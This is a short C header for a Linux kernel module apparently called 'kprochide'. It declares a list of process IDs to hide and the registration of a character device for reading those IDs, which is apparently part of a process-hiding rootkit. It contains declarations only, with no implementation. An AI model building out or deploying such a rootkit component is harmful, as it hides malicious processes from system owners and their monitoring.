#pragma once

#include <linux/init.h>
#include <linux/module.h>
#include <linux/list.h>
#include <linux/kernel.h>
#include <linux/types.h>

struct pid_to_hide {
    pid_t pid;
    struct list_head l_head;
};

extern struct list_head kprochide_pids_to_hide;

// register and unregister the char device.
int register_readpid_chrdev(const char* device_name);
void unregister_readpid_chrdev(int major_num, const char* device_name);
